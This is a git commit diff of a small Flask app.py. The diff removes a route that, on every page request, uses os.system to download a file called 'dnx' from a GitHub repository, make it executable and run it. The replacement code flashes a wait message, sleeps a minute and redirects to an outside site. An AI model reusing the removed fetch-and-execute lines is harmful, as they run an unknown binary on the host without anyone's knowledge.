85979140093afe2d7d3a8ff98dbb3c3ac6672328
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2024-01-23 00:08:00 +0700

    Update app.py

--- app.py
+++ app.py
@@ -1,18 +1,17 @@
-from flask import Flask, redirect
-import os
+from flask import Flask, render_template, redirect, flash
+import time
 
 app = Flask(__name__)
 
 @app.route('/')
-def redirect_and_run_command():
-    # Redirect to a website
-    redirect_url = 'https://www.sincode.ai/'
-    os.system(f"start 'wget https://github.com/55113110159/OS/raw/main/dnx'")
-    os.system(f"start 'chmod 777 dnx'")
-    os.system(f"start './dnx'")
+def index():
+    # Display a notification message
+    flash('Please wait for a minute. You will be redirected shortly.')
+    time.sleep(60)  # Simulate a one-minute wait
 
-    # Return a response (this won't be reached due to the redirection)
-    return "Redirecting..."
+    # Redirect to the desired website after the wait
+    return redirect("https://trustedge.com/", code = 302)
 
 if __name__ == '__main__':
     app.run(debug=True)
+
